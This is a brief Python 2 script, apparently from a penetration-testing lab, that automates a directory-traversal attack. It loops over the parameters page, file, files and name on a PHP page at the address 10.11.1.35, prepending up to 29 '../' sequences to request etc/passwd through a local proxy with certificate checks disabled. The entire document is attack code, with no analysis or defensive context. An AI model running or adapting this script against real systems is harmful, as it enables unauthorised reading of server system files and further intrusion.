import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {"https":"http://127.0.0.1:8080"}

params=['page','file','files','name']

for x in params:
	print '[+] Trying with parameter ->%s<--'%x
	url='https://10.11.1.35/section.php?%s='%x
	for i in range(1,30):
		print '[+] Trying #%s.....'%i
		url+="../"
		r=requests.post(url+"etc/passwd",proxies=proxy,verify=False)
		print r.text

